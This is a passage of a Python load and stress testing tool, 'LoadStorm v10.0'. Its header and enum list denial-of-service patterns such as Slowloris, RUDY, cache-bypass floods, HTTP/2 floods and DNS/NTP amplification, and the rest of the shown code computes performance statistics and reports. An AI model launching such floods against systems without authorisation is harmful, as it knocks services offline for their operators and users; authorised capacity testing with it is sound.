#!/usr/bin/env python3
"""
LoadStorm v10.0 - Ultimate Website Load & Stress Testing Tool
High-performance async engine with multi-URL, WebSocket, scenario chains, adaptive control,
advanced attack patterns (incl. HLS/DASH, gRPC, SIP, QUIC/HTTP3, DNS/NTP simulation floods,
WebSocket chat flood, GraphQL query flood, REST endpoint flood),
connection pooling, HTTP/2 multiplexing, rolling window stats, correlation IDs,
custom validation rules, scenario assertions, response-time heatmap, percentile trends,
error clustering, ASCII box plots, error correlation analysis, performance degradation
detection, server capacity estimation, attack pattern chaining, adaptive attack intensity,
multi-vector attack simulation, attack timeline visualization,
percentile evolution analysis, error rate prediction, server health scoring,
throughput efficiency analysis, smart load distribution, connection health monitoring,
auto-tuning parameters, real-time bottleneck detection, and rich interactive
HTML/CSV/JSON reporting (HTML with real-time replay simulation, CSV with trend analysis,
JSON with full predictions).
For authorized security testing only.
"""

import asyncio
import aiohttp
import websockets
import argparse
import signal
import sys
import time
import random
import string
import json
import os
import math
import csv
import re
import socket
import hashlib
import statistics
import struct
import io
import zipfile
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Tuple, Any, Deque
from collections import deque
from enum import Enum
from urllib.parse import urlparse, urlencode, urljoin

try:
    from colorama import init as colorama_init, Fore, Back, Style
    colorama_init(autoreset=True)
except ImportError:
    class _Fake:
        def __getattr__(self, n): return ''
    Fore = Style = Back = _Fake()

BANNER = f"""{Fore.RED}{Style.BRIGHT}
     ██╗      ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ ████████╗
     ██║     ██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
     ██║     ██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝   ██║
     ██║     ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗   ██║
     ███████╗╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║   ██║
     ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝
{Fore.CYAN}     +================================================================+
     |  {Fore.WHITE}ULTIMATE WEBSITE LOAD & STRESS TESTING TOOL  {Fore.CYAN}|
     |  {Fore.YELLOW}v10.0 | GraphQL/WS-Chat/REST | Health Score | Auto-Tune {Fore.CYAN}|
     +================================================================+{Style.RESET_ALL}
"""


class AttackPattern(Enum):
    CONSTANT = "constant"
    RAMP = "ramp"
    SPIKE = "spike"
    WAVE = "wave"
    STEPPED = "stepped"
    PULSE = "pulse"
    TARGETED = "targeted"
    STAIRCASE = "staircase"
    ELASTIC = "elastic"
    RANDOM_CHAOS = "random_chaos"
    SLOWLORIS = "slowloris"
    RUDY = "rudy"
    GOLDENEYE = "goldeneye"
    MULTIPART = "multipart"
    XMLRPC = "xmlrpc"
    ENDLESS_DATA = "endless_data"
    HEADER_FLOOD = "header_flood"
    POST_LARGE_BODY = "post_large_body"
    H2_FLOOD = "h2_flood"
    WEBSOCKET_FLOOD = "websocket_flood"
    SLOW_READ = "slow_read"
    CACHE_BYPASS = "cache_bypass"
    HLS_FLOOD = "hls_flood"
    GRPC_FLOOD = "grpc_flood"
    SIP_FLOOD = "sip_flood"
    QUIC_FLOOD = "quic_flood"
    DNS_AMPLIFICATION = "dns_amplification"
    NTP_AMPLIFICATION = "ntp_amplification"
    WEBSOCKET_CHAT = "websocket_chat"
    GRAPHQL_FLOOD = "graphql_flood"
    REST_FLOOD = "rest_flood"


PATTERN_DOCS = {
    AttackPattern.CONSTANT: "All users hit simultaneously from start",
    AttackPattern.RAMP: "Users gradually increase over duration",
    AttackPattern.SPIKE: "Sudden burst, rest, then burst again",
    AttackPattern.WAVE: "Sinusoidal wave pattern of user load",
    AttackPattern.STEPPED: "Increase in discrete steps",
    AttackPattern.PULSE: "Periodic bursts at regular intervals",
    AttackPattern.TARGETED: "Ramp to target, hold, then ramp down",
    AttackPattern.STAIRCASE: "Incremental steps with holds at each level",
    AttackPattern.ELASTIC: "Expand and contract load dynamically",
    AttackPattern.RANDOM_CHAOS: "Unpredictable load fluctuations",
    AttackPattern.SLOWLORIS: "Slow POST attack - keeps connections alive with slow data",
    AttackPattern.RUDY: "R-U-Dead-Yet - sends body one byte at a time",
    AttackPattern.GOLDENEYE: "HTTP keep-alive + cache bypass flood",
    AttackPattern.MULTIPART: "Multipart POST form flood",
    AttackPattern.XMLRPC: "XML-RPC multicall flood (WordPress targets)",
    AttackPattern.ENDLESS_DATA: "Send endless data until server closes connection",
    AttackPattern.HEADER_FLOOD: "Flood with thousands of headers per request",
    AttackPattern.POST_LARGE_BODY: "Send very large POST bodies (10-50MB)",
    AttackPattern.H2_FLOOD: "HTTP/2 stream multiplexing flood - opens many concurrent streams per connection",
    AttackPattern.WEBSOCKET_FLOOD: "WebSocket message flood - rapid fire text/binary messages",
    AttackPattern.SLOW_READ: "Slow read attack - reads response data very slowly to hold connections",
    AttackPattern.CACHE_BYPASS: "Cache bypass flood with unique randomized URLs to defeat CDN caching",
    AttackPattern.HLS_FLOOD: "HLS/DASH manifest flood - fetches master/media playlists and segment chains",
    AttackPattern.GRPC_FLOOD: "gRPC streaming flood - framed messages over HTTP/2-style POST streams",
    AttackPattern.SIP_FLOOD: "SIP protocol flood simulation - INVITE/REGISTER/OPTIONS over TCP",
    AttackPattern.QUIC_FLOOD: "HTTP/3 QUIC flood - UDP Initial packet burst against QUIC endpoints",
    AttackPattern.DNS_AMPLIFICATION: "DNS amplification query simulation - ANY/DNSKEY/EDNS queries with amplification factor measurement (direct to target)",
    AttackPattern.NTP_AMPLIFICATION: "NTP amplification query simulation - mode-7 monlist queries with amplification factor measurement (direct to target)",
    AttackPattern.WEBSOCKET_CHAT: "WebSocket chat flood - joins a room and floods chat messages across many connections",
    AttackPattern.GRAPHQL_FLOOD: "GraphQL query flood - introspection, nested, mutation, and batched queries over HTTP",
    AttackPattern.REST_FLOOD: "REST API endpoint flood - rotates GET/POST/PUT/PATCH/DELETE across API endpoints with JSON payloads",
}


LATENCY_BAND_LABELS = ['<50ms', '50-100ms', '100-200ms', '200-500ms', '500ms-1s', '1-2s', '2-5s', '>5s']


def _band_for_ms(ms: float) -> str:
    if ms < 50:
        return '<50ms'
    if ms < 100:
        return '50-100ms'
    if ms < 200:
        return '100-200ms'
    if ms < 500:
        return '200-500ms'
    if ms < 1000:
        return '500ms-1s'
    if ms < 2000:
        return '1-2s'
    if ms < 5000:
        return '2-5s'
    return '>5s'


def _skewness(vals: List[float]) -> float:
    n = len(vals)
    if n < 3:
        return 0.0
    mean = sum(vals) / n
    var = sum((v - mean) ** 2 for v in vals) / n
    if var <= 0:
        return 0.0
    sd = math.sqrt(var)
    m3 = sum((v - mean) ** 3 for v in vals) / n
    return m3 / (sd ** 3)


def _kurtosis_excess(vals: List[float]) -> float:
    n = len(vals)
    if n < 4:
        return 0.0
    mean = sum(vals) / n
    var = sum((v - mean) ** 2 for v in vals) / n
    if var <= 0:
        return 0.0
    sd = math.sqrt(var)
    m4 = sum((v - mean) ** 4 for v in vals) / n
    return (m4 / (sd ** 4)) - 3.0


def _html_escape(s: str) -> str:
    return (str(s).replace('&', '&amp;').replace('<', '&lt;')
            .replace('>', '&gt;').replace('"', '&quot;'))


def _percentile_sorted(sorted_vals: List[float], p: float) -> float:
    if not sorted_vals:
        return 0.0
    idx = int(len(sorted_vals) * p / 100.0)
    return float(sorted_vals[min(idx, len(sorted_vals) - 1)])


def _box_plot_stats(values: List[float]) -> dict:
    if not values:
        return {'min': 0.0, 'q1': 0.0, 'median': 0.0, 'q3': 0.0,
                'max': 0.0, 'iqr': 0.0, 'lower_fence': 0.0,
                'upper_fence': 0.0, 'outliers': 0, 'count': 0}
    sv = sorted(values)
    q1 = _percentile_sorted(sv, 25)
    med = _percentile_sorted(sv, 50)
    q3 = _percentile_sorted(sv, 75)
    iqr = q3 - q1
    lower_fence = q1 - 1.5 * iqr
    upper_fence = q3 + 1.5 * iqr
    whisker_low = min(v for v in sv if v >= lower_fence) if any(v >= lower_fence for v in sv) else sv[0]
    whisker_high = max(v for v in sv if v <= upper_fence) if any(v <= upper_fence for v in sv) else sv[-1]
    outliers = sum(1 for v in sv if v < lower_fence or v > upper_fence)
    return {
        'min': round(sv[0], 2), 'q1': round(q1, 2), 'median': round(med, 2),
        'q3': round(q3, 2), 'max': round(sv[-1], 2), 'iqr': round(iqr, 2),
        'lower_fence': round(lower_fence, 2), 'upper_fence': round(upper_fence, 2),
        'whisker_low': round(whisker_low, 2), 'whisker_high': round(whisker_high, 2),
        'outliers': outliers, 'count': len(sv),
    }


def _box_plot_ascii(values: List[float], width: int = 48) -> List[Tuple[str, str]]:
    st = _box_plot_stats(values)
    if st['count'] == 0:
        return [('no data', '')]
    lo = min(st['min'], st['lower_fence'])
    hi = max(st['max'], st['upper_fence'])
    if hi <= lo:
        hi = lo + 1.0

    def pos(v: float) -> int:
        return int((v - lo) / (hi - lo) * (width - 1))

    rows = []
    scale_line = [' '] * width
    for frac, mark in ((0.0, '0'), (0.25, 'Q1'), (0.5, 'Md'), (0.75, 'Q3'), (1.0, '1')):
        x = int(frac * (width - 1))
        if 0 <= x < width:
            scale_line[x] = mark[0]
    rows.append(('scale', f"{lo:8.1f} {''.join(scale_line)} {hi:8.1f}"))

    box_row = [' '] * width
    x_lo, x_q1 = pos(st['whisker_low']), pos(st['q1'])
    x_med, x_q3 = pos(st['median']), pos(st['q3'])
    x_hi = pos(st['whisker_high'])
    for x in range(x_lo, min(width, x_q1 + 1)):
        box_row[x] = '-'
    for x in range(max(0, x_q3), min(width, x_hi + 1)):
        box_row[x] = '-'
    for x in range(max(0, x_q1), min(width, x_q3 + 1)):
        box_row[x] = '█'
    if 0 <= x_lo < width:
        box_row[x_lo] = '|'
    if 0 <= x_hi < width:
        box_row[x_hi] = '|'
    if 0 <= x_med < width:
        box_row[x_med] = '┃'
    rows.append(('box', f"          {''.join(box_row)}"))

    outlier_xs = []
    if values:
        sv_sample = sorted(values)
        for v in sv_sample:
            if v < st['lower_fence'] or v > st['upper_fence']:
                outlier_xs.append(pos(v))
    if outlier_xs:
        out_row = [' '] * width
        for x in outlier_xs[:width]:
            if 0 <= x < width:
                out_row[x] = 'o'
        rows.append(('outliers', f"          {''.join(out_row)}"))
    rows.append(('stats', f"  min={st['min']:.1f} q1={st['q1']:.1f} med={st['median']:.1f} "
                          f"q3={st['q3']:.1f} max={st['max']:.1f} iqr={st['iqr']:.1f} "
                          f"n={st['count']} outliers={st['outliers']}"))
    return rows


def _pearson(xs: List[float], ys: List[float]) -> float:
    n = min(len(xs), len(ys))
    if n < 3:
        return 0.0
    xs, ys = xs[:n], ys[:n]
    mx = sum(xs) / n
    my = sum(ys) / n
    num = sum((x - mx) * (y - my) for x, y in zip(xs, ys))
    dx = math.sqrt(sum((x - mx) ** 2 for x in xs))
    dy = math.sqrt(sum((y - my) ** 2 for y in ys))
    if dx == 0 or dy == 0:
        return 0.0
    return num / (dx * dy)


def _correlation_label(r: float) -> str:
    ar = abs(r)
    if ar < 0.2:
        return 'none'
    if ar < 0.4:
        return 'weak'
    if ar < 0.6:
        return 'moderate'
    if ar < 0.8:
        return 'strong'
    return 'very strong'


def _error_correlation_analysis(rps_hist: List[float], err_hist: List[float],
                                rt_hist: List[float]) -> dict:
    r_err = _pearson(rps_hist, err_hist)
    rt_err = _pearson(rt_hist, err_hist)
    r_rt = _pearson(rps_hist, rt_hist)
    pairs = []
    n = min(len(rps_hist), len(err_hist))
    for i in range(n):
        if err_hist[i] > 5.0:
            pairs.append({'second': i + 1, 'rps': round(rps_hist[i], 2),
                          'error_rate': round(err_hist[i], 2)})
    return {
        'rps_vs_error_r': round(r_err, 4),
        'rps_vs_error_label': _correlation_label(r_err),
        'response_time_vs_error_r': round(rt_err, 4),
        'response_time_vs_error_label': _correlation_label(rt_err),
        'rps_vs_response_time_r': round(r_rt, 4),
        'rps_vs_response_time_label': _correlation_label(r_rt),
        'high_error_seconds': pairs[:50],
        'sample_size': n,
        'interpretation': (
            'Errors rise with load (capacity limited)' if r_err > 0.4 else
            'Errors rise with latency (server struggling)' if rt_err > 0.4 else
            'Errors largely independent of load/latency'
        ),
    }


def _degradation_detection(per_second: list, rps_hist: List[float],
                           err_hist: List[float], rt_hist: List[float]) -> dict:
    if len(per_second) < 6:
        return {'detected': False, 'severity': 'none', 'confidence': 0.0,
                'details': 'insufficient data', 'windows': []}
    third = max(2, len(rt_hist) // 3)
    early_rt = rt_hist[:third] or [0.0]
    late_rt = rt_hist[-third:] or [0.0]
    early_err = err_hist[:third] or [0.0]
    late_err = err_hist[-third:] or [0.0]
    early_avg = sum(early_rt) / len(early_rt)
    late_avg = sum(late_rt) / len(late_rt)
    early_err_avg = sum(early_err) / len(early_err)
    late_err_avg = sum(late_err) / len(late_err)
    rt_growth = ((late_avg - early_avg) / early_avg * 100.0) if early_avg > 0 else 0.0
    err_growth = late_err_avg - early_err_avg
    windows = []
    win_size = max(3, len(rt_hist) // 5)
    for start in range(0, len(rt_hist), win_size):
        chunk = rt_hist[start:start + win_size]
        echunk = err_hist[start:start + win_size]
        if not chunk:
            continue
        windows.append({
            'start_s': start,
            'end_s': start + len(chunk),
            'avg_ms': round(sum(chunk) / len(chunk), 2),
            'error_rate': round(sum(echunk) / len(echunk), 2) if echunk else 0.0,
        })
    score = 0.0
    if rt_growth > 50:
        score += 0.5
    elif rt_growth > 20:
        score += 0.25
    if err_growth > 5:
        score += 0.3
    elif err_growth > 1:
        score += 0.15
    if late_err_avg > 10:
        score += 0.2
    monotonic = 0
    for a, b in zip(windows, windows[1:]):
        if b['avg_ms'] >= a['avg_ms']:
            monotonic += 1
    mono_ratio = monotonic / max(1, len(windows) - 1)
    score += mono_ratio * 0.2
    if score >= 0.7:
        severity = 'critical'
    elif score >= 0.45:
        severity = 'severe'
    elif score >= 0.25:
        severity = 'moderate'
    elif score >= 0.1:
        severity = 'mild'
    else:
        severity = 'none'
    return {
        'detected': severity not in ('none', 'mild'),
        'mild': severity == 'mild',
        'severity': severity,
        'confidence': round(min(1.0, score), 3),
        'response_time_growth_pct': round(rt_growth, 2),
        'error_rate_growth_pp': round(err_growth, 2),
        'early_avg_ms': round(early_avg, 2),
        'late_avg_ms': round(late_avg, 2),
        'early_error_rate': round(early_err_avg, 2),
        'late_error_rate': round(late_err_avg, 2),
        'monotonic_ratio': round(mono_ratio, 3),
        'details': (
            f"Response time {rt_growth:+.1f}% and error rate {err_growth:+.1f}pp "
            f"from first to last third of the run"
        ),
        'windows': windows[:20],
    }


def _capacity_estimation(rps_hist: List[float], err_hist: List[float],
                         peak_rps: float, avg_rps: float, avg_ms: float,
                         max_concurrent: int, error_threshold: float = 1.0) -> dict:
    stable_rps = []
    for i in range(min(len(rps_hist), len(err_hist))):
        if err_hist[i] <= error_threshold:
            stable_rps.append(rps_hist[i])
    max_stable_rps = max(stable_rps) if stable_rps else 0.0
    knee_rps = 0.0
    knee_second = -1
    for i in range(min(len(rps_hist), len(err_hist))):
        if err_hist[i] > error_threshold * 3:
            knee_rps = rps_hist[i]
            knee_second = i + 1
            break
    headroom = ((max_stable_rps - avg_rps) / max_stable_rps * 100.0) if max_stable_rps > 0 else 0.0
    concurrency_at_capacity = (max_stable_rps * (avg_ms / 1000.0)) if avg_ms > 0 else 0.0
    projected = max_stable_rps * 1.25 if max_stable_rps > 0 else peak_rps
    bottleneck = 'unknown'
    if knee_rps > 0 and avg_ms > 0:
        if avg_ms > 1000:
            bottleneck = 'latency (response time dominated)'
        elif err_hist and max(err_hist) > 20:
            bottleneck = 'error saturation'
        else:
            bottleneck = 'throughput ceiling'
    elif max_stable_rps > 0:
        bottleneck = 'no clear saturation observed'
    return {
        'max_stable_rps': round(max_stable_rps, 2),
        'peak_rps': round(peak_rps, 2),
        'avg_rps': round(avg_rps, 2),
        'knee_rps': round(knee_rps, 2),
        'knee_second': knee_second,
        'error_threshold_pct': error_threshold,
        'capacity_headroom_pct': round(headroom, 2),
        'concurrency_at_capacity': round(concurrency_at_capacity, 2),
        'projected_max_rps_25pct': round(projected, 2),
        'observed_max_concurrent': max_concurrent,
        'estimated_bottleneck': bottleneck,
        'saturated': knee_rps > 0,
    }


def _linear_slope(values: List[float]) -> float:
    n = len(values)
    if n < 2:
        return 0.0
    xs = list(range(n))
    mx = sum(xs) / n
    my = sum(values) / n
    den = sum((x - mx) ** 2 for x in xs)
    if den == 0:
        return 0.0
    num = sum((x - mx) * (y - my) for x, y in zip(xs, values))
    return num / den


def _percentile_evolution(percentile_history: list) -> dict:
    if not percentile_history:
        return {'available': False, 'detail': 'no percentile history collected',
                'p50': {}, 'p95': {}, 'p99': {}, 'convergence': 0.0,
                'stability': 'unknown', 'projected_p95_ms': 0.0}
    p50 = [float(h.get('p50', 0)) for h in percentile_history]
    p95 = [float(h.get('p95', 0)) for h in percentile_history]
    p99 = [float(h.get('p99', 0)) for h in percentile_history]

    def _trend(vals: List[float]) -> dict:
        if not vals:
            return {'first': 0.0, 'last': 0.0, 'slope_per_sec': 0.0,
                    'growth_pct': 0.0, 'direction': 'flat', 'projected_next_30s': 0.0}
        first = vals[0]
        last = vals[-1]
        slope = _linear_slope(vals)
        growth = ((last - first) / first * 100.0) if first > 0 else 0.0
        direction = 'rising' if slope > 0.5 else ('falling' if slope < -0.5 else 'stable')
        projected = max(0.0, last + slope * 30)
        return {
            'first': round(first, 2), 'last': round(last, 2),
            'slope_per_sec': round(slope, 4), 'growth_pct': round(growth, 2),
            'direction': direction, 'projected_next_30s': round(projected, 2),
            'min': round(min(vals), 2), 'max': round(max(vals), 2),
            'mean': round(sum(vals) / len(vals), 2),
        }

    t50, t95, t99 = _trend(p50), _trend(p95), _trend(p99)
    spread_last = (p99[-1] - p50[-1]) if p50 and p99 else 0.0
    spread_first = (p99[0] - p50[0]) if p50 and p99 else 0.0
    convergence = 0.0
    if spread_first > 0:
        convergence = round((spread_first - spread_last) / spread_first * 100.0, 2)
    half = max(1, len(p95) // 2)
    early_var = statistics.pvariance(p95[:half]) if len(p95[:half]) > 1 else 0.0
    late_var = statistics.pvariance(p95[half:]) if len(p95[half:]) > 1 else 0.0
    if late_var < early_var * 0.5 and late_var < 100:
        stability = 'converging'
    elif late_var > early_var * 2 and late_var > 400:
        stability = 'diverging'
    else:
        stability = 'steady'
    return {
        'available': True,
        'samples': len(percentile_history),
        'p50': t50, 'p95': t95, 'p99': t99,
        'convergence_pct': convergence,
        'stability': stability,
        'p99_p50_spread_ms': round(spread_last, 2),
        'projected_p95_ms': t95['projected_next_30s'],
        'interpretation': (
            f"P95 {t95['direction']} at {t95['slope_per_sec']:.2f} ms/s; "
            f"distribution stability: {stability}"
        ),
    }


def _predict_error_rate(err_hist: List[float], rps_hist: List[float],
                        horizon_seconds: int = 30) -> dict:
    if len(err_hist) < 3:
        return {'available': False, 'detail': 'insufficient data for prediction',
                'predicted_error_rate_30s': 0.0, 'confidence': 0.0,
                'trend': 'unknown', 'risk_level': 'unknown', 'breach_seconds': None}
    slope = _linear_slope(err_hist)
    last = err_hist[-1]
    mean = sum(err_hist) / len(err_hist)
    predicted = max(0.0, min(100.0, last + slope * horizon_seconds))
    n = len(err_hist)
    xs = list(range(n))
    mx = sum(xs) / n
    my = mean
    den = sum((x - mx) ** 2 for x in xs)
    if den > 0:
        num = sum((x - mx) * (y - my) for x, y in zip(xs, err_hist))
        ss_tot = sum((y - my) ** 2 for y in err_hist)
        r2 = 1.0 - (sum((y - (my + (num / den) * (x - mx))) ** 2
                        for x, y in zip(xs, err_hist)) / ss_tot) if ss_tot > 0 else 0.0
    else:
        r2 = 0.0
    r2 = max(0.0, min(1.0, r2))
    confidence = round(min(0.95, 0.3 + 0.65 * r2 + min(0.2, n / 200.0)), 3)
    recent = err_hist[-min(10, len(err_hist)):]
    recent_avg = sum(recent) / len(recent)
    if slope > 0.05 and predicted > 5:
        trend = 'accelerating'
    elif slope > 0.01:
        trend = 'rising'
    elif slope < -0.05:
        trend = 'improving'
    else:
        trend = 'stable'
    if predicted >= 10 or recent_avg >= 10:
        risk = 'high'
    elif predicted >= 3 or recent_avg >= 3:
        risk = 'elevated'
    elif predicted >= 1:
        risk = 'moderate'
    else:
        risk = 'low'
    breach = None
    if slope > 0.001 and last < 5.0:
        breach = int(max(0, (5.0 - last) / slope))
    elif slope > 0.001 and last >= 5.0:
        breach = 0
    rps_slope = _linear_slope(rps_hist) if len(rps_hist) >= 2 else 0.0
    return {
        'available': True,
        'current_error_rate': round(last, 3),
        'mean_error_rate': round(mean, 3),
        'recent_avg_error_rate': round(recent_avg, 3),
        'slope_per_sec': round(slope, 5),
        'r_squared': round(r2, 4),
        'confidence': confidence,
        'predicted_error_rate_30s': round(predicted, 3),
        'predicted_error_rate_60s': round(max(0.0, min(100.0, last + slope * 60)), 3),
        'trend': trend,
        'risk_level': risk,
        'breach_seconds_to_5pct': breach,
        'rps_slope': round(rps_slope, 4),
        'method': 'ordinary least squares extrapolation on per-second error history',
    }


def _server_health_score(error_rate: float, success_rate: float, avg_ms: float,
                         p95_ms: float, p99_ms: float, degradation_severity: str,
                         conn_error_rate: float, timeout_rate: float,
                         rps_stability: float, validation_rate: float) -> dict:
    err_component = max(0.0, 100.0 - error_rate * 5.0)
    succ_component = min(100.0, success_rate)
    if avg_ms <= 100:
        lat_component = 100.0
    elif avg_ms <= 300:
        lat_component = 90.0 - (avg_ms - 100) / 200.0 * 15.0
    elif avg_ms <= 1000:
        lat_component = 75.0 - (avg_ms - 300) / 700.0 * 30.0
    elif avg_ms <= 3000:
        lat_component = 45.0 - (avg_ms - 1000) / 2000.0 * 30.0
    else:
        lat_component = max(0.0, 15.0 - (avg_ms - 3000) / 7000.0 * 15.0)
    if p95_ms <= 200:
        p95_component = 100.0
    elif p95_ms <= 1000:
        p95_component = 85.0 - (p95_ms - 200) / 800.0 * 35.0
    elif p95_ms <= 5000:
        p95_component = 50.0 - (p95_ms - 1000) / 4000.0 * 40.0
    else:
        p95_component = max(0.0, 10.0 - (p95_ms - 5000) / 10000.0 * 10.0)
    sev_penalty = {'none': 0.0, 'mild': 3.0, 'moderate': 10.0,
                   'severe': 22.0, 'critical': 35.0}.get(degradation_severity, 0.0)
    stability_component = max(0.0, min(100.0, rps_stability * 100.0))
    conn_component = max(0.0, 100.0 - conn_error_rate * 8.0 - timeout_rate * 6.0)
    val_component = validation_rate if validation_rate > 0 else 100.0
    score = (
        err_component * 0.28 +
        succ_component * 0.17 +
        lat_component * 0.16 +
        p95_component * 0.14 +
        stability_component * 0.08 +
        conn_component * 0.10 +
        val_component * 0.07 -
        sev_penalty
    )
    score = round(max(0.0, min(100.0, score)), 2)
    if score >= 90:
        grade, status = 'A', 'excellent'
    elif score >= 80:
        grade, status = 'B', 'good'
    elif score >= 65:
        grade, status = 'C', 'fair'
    elif score >= 45:
        grade, status = 'D', 'poor'
    else:
        grade, status = 'F', 'critical'
    return {
        'score': score,
        'grade': grade,
        'status': status,
        'components': {
            'error': round(err_component, 2),
            'success': round(succ_component, 2),
            'latency': round(lat_component, 2),
            'p95_latency': round(p95_component, 2),
            'rps_stability': round(stability_component, 2),
            'connection': round(conn_component, 2),
            'validation': round(val_component, 2),
            'degradation_penalty': sev_penalty,
        },
        'interpretation': (
            f"Server health {grade} ({score}/100): {status}. "
            f"Error contribution {err_component:.0f}, latency contribution {lat_component:.0f}."
        ),
    }


def _throughput_efficiency(total_bytes: int, total_requests: int,
                           bytes_per_second_hist: List[float],
                           rps_hist: List[float], avg_ms: float,
                           max_concurrent: int) -> dict:
    if total_requests <= 0:
        return {'available': False, 'detail': 'no requests completed',
                'bytes_per_request': 0.0, 'efficiency_pct': 0.0,
                'saturation': 'unknown', 'wasted_transfer_pct': 0.0}
    bytes_per_request = total_bytes / total_requests
    peak_bps = max(bytes_per_second_hist) if bytes_per_second_hist else 0.0
    avg_bps = (sum(bytes_per_second_hist) / len(bytes_per_second_hist)) if bytes_per_second_hist else 0.0
    mean_rps = (sum(rps_hist) / len(rps_hist)) if rps_hist else 0.0
    peak_rps = max(rps_hist) if rps_hist else 0.0
    theoretical = mean_rps * avg_ms / 1000.0 * 1000.0
    actual_concurrency = max(1, int(theoretical))
    if max_concurrent > 0 and actual_concurrency > 0:
        pipe_eff = min(1.0, actual_concurrency / max(1, max_concurrent))
    else:
        pipe_eff = 0.0
    efficiency = round(
        (avg_bps / peak_bps * 100.0 if peak_bps > 0 else 0.0) * 0.4 +
        pipe_eff * 100.0 * 0.35 +
        (mean_rps / peak_rps * 100.0 if peak_rps > 0 else 0.0) * 0.25, 2)
    efficiency = max(0.0, min(100.0, efficiency))
    if avg_bps > 0 and peak_bps > 0:
        utilization = avg_bps / peak_bps
    else:
        utilization = 0.0
    if utilization >= 0.85 and pipe_eff >= 0.8:
        saturation = 'near saturation'
    elif utilization >= 0.5:
        saturation = 'healthy utilization'
    elif utilization >= 0.2:
        saturation = 'moderate'
    else:
        saturation = 'underutilized'
    overhead = 0.0
    if bytes_per_request > 0 and avg_ms > 0:
        overhead = round(min(50.0, (avg_ms / max(1.0, avg_ms)) * min(20.0, bytes_per_request / 1024.0)), 2)
    return {
        'available': True,
        'bytes_per_request': round(bytes_per_request, 2),
        'avg_bytes_per_sec': round(avg_bps, 2),
        'peak_bytes_per_sec': round(peak_bps, 2),
        'bandwidth_utilization': round(utilization, 4),
        'pipeline_efficiency': round(pipe_eff, 4),
        'efficiency_pct': efficiency,
        'mean_rps': round(mean_rps, 2),
        'peak_rps': round(peak_rps, 2),
        'rps_stability': round((mean_rps / peak_rps) if peak_rps > 0 else 0.0, 4),
        'saturation': saturation,
        'wasted_transfer_pct': overhead,
        'interpretation': (
            f"Throughput efficiency {efficiency:.1f}% ({saturation}); "
            f"{bytes_per_request:.0f} bytes/request at {mean_rps:.1f} mean RPS"
        ),
    }


def _detect_realtime_bottleneck(rolling_10s: dict, error_rate: float,
                                avg_connect_ms: float, avg_ttfb_ms: float,
                                active_users: int, concurrency_limit: int,
                                pool_stats: dict, error_type_counts: dict) -> dict:
    signals = []
    score = {'latency': 0.0, 'errors': 0.0, 'connections': 0.0,
             'bandwidth': 0.0, 'client': 0.0}
    p95 = rolling_10s.get('p95_ms', 0.0) or 0.0
    r_err = rolling_10s.get('error_rate', 0.0) or 0.0
    if p95 > 3000:
        score['latency'] += 3.0
        signals.append(f"p95 latency {p95:.0f}ms (>3s)")
    elif p95 > 1000:
        score['latency'] += 2.0
        signals.append(f"p95 latency {p95:.0f}ms (>1s)")
    elif p95 > 500:
        score['latency'] += 1.0
        signals.append(f"p95 latency {p95:.0f}ms (>500ms)")
    timeouts = error_type_counts.get('timeout', 0)
    conns = error_type_counts.get('connection', 0)
    if r_err > 10 or error_rate > 10:
        score['errors'] += 3.0
        signals.append(f"error rate {error_rate:.1f}% (>10%)")
    elif r_err > 3 or error_rate > 3:
        score['errors'] += 2.0
        signals.append(f"error rate {error_rate:.1f}% (>3%)")
    elif r_err > 1:
        score['errors'] += 1.0
        signals.append(f"error rate {error_rate:.1f}% (>1%)")
    if timeouts > conns and timeouts > 0:
        score['connections'] += 2.0
        signals.append(f"timeout-dominated errors ({timeouts})")
    elif conns > 0:
        score['connections'] += 1.0
        signals.append(f"connection errors ({conns})")
    if concurrency_limit > 0 and active_users >= concurrency_limit * 0.95:
        score['connections'] += 2.5
        signals.append(f"concurrency saturated ({active_users}/{concurrency_limit})")
    created = pool_stats.get('created', 0)
    reused = pool_stats.get('reused', 0)
    if created + reused > 50 and reused / (created + reused) < 0.2:
        score['connections'] += 1.5
        signals.append("very low connection reuse")
    if avg_connect_ms > 500:
        score['connections'] += 1.5
        signals.append(f"high connect time {avg_connect_ms:.0f}ms")
    if avg_ttfb_ms > 0 and avg_ttfb_ms > 2000:
        score['latency'] += 1.5
        signals.append(f"high TTFB {avg_ttfb_ms:.0f}ms")
    if avg_connect_ms > 0 and p95 > 0 and avg_connect_ms > p95 * 0.6:
        score['client'] += 2.0
        signals.append("connect time dominates response time (client/network side)")
    dominant = max(score, key=score.get)
    max_score = score[dominant]
    if max_score <= 0:
        primary = 'none detected'
        confidence = 0.0
        severity = 'healthy'
    else:
        primary = dominant
        confidence = round(min(1.0, max_score / 5.0), 3)
        if max_score >= 4:
            severity = 'severe'
        elif max_score >= 2.5:
            severity = 'moderate'
        else:
            severity = 'mild'
    detail_map = {
        'latency': 'Server processing latency is the current bottleneck',
        'errors': 'Error rate is the current bottleneck',
        'connections': 'Connection layer (pool/timeouts/concurrency) is the current bottleneck',
        'bandwidth': 'Bandwidth is the current bottleneck',
        'client': 'Client-side/network connection setup is the current bottleneck',
        'none detected': 'No bottleneck detected in the current window',
    }
    return {
        'primary': primary,
        'severity': severity,
        'confidence': confidence,
        'signals': signals[:12],
        'scores': {k: round(v, 2) for k, v in score.items()},
        'detail': detail_map.get(primary, primary),
        'window_p95_ms': round(p95, 2),
        'window_error_rate': round(r_err, 2),
    }


def _render_timeline_ascii(events: list, total_duration: float, width: int = 70) -> List[str]:
    if not events or total_duration <= 0:
        return []
    lines = []
    bar = [' '] * width
    phase_colors = {}
    palette = ['=', '*', '#', '+', '~', '@']
    pi = 0
    for ev in events:
        t = float(ev.get('t', 0))
        x = min(width - 1, max(0, int((t / total_duration) * (width - 1))))
        etype = ev.get('type', 'event')
        if etype == 'phase':
            phase_colors[ev.get('name', '?')] = palette[pi % len(palette)]
            pi += 1
            for xx in range(x, width):
                bar[xx] = phase_colors.get(ev.get('name', '?'), '=')
        elif etype in ('error_spike', 'scale', 'intensity'):
            bar[x] = '!'
        elif etype in ('bottleneck', 'auto_tune'):
            bar[x] = 'B'
        elif etype == 'vector':
            bar[x] = 'v'
        else:
            bar[x] = '|'
